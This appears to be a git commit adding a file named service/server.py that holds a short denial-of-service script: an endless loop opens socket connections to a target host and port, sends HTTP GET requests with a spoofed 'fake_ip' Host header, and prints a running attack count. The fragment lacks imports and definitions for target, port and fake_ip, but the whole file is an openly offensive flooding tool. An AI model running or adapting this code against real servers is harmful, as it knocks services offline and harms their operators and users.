26dea6d1f04e573c861f0a68a34bb35e940706be
LuzyXFrield <130589708+lizyangelxdark@users.noreply.github.com>
2023-05-08 02:17:33 +0300

    Create server.py

---
+++ service/server.py
@@ -0,0 +1,14 @@
+attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
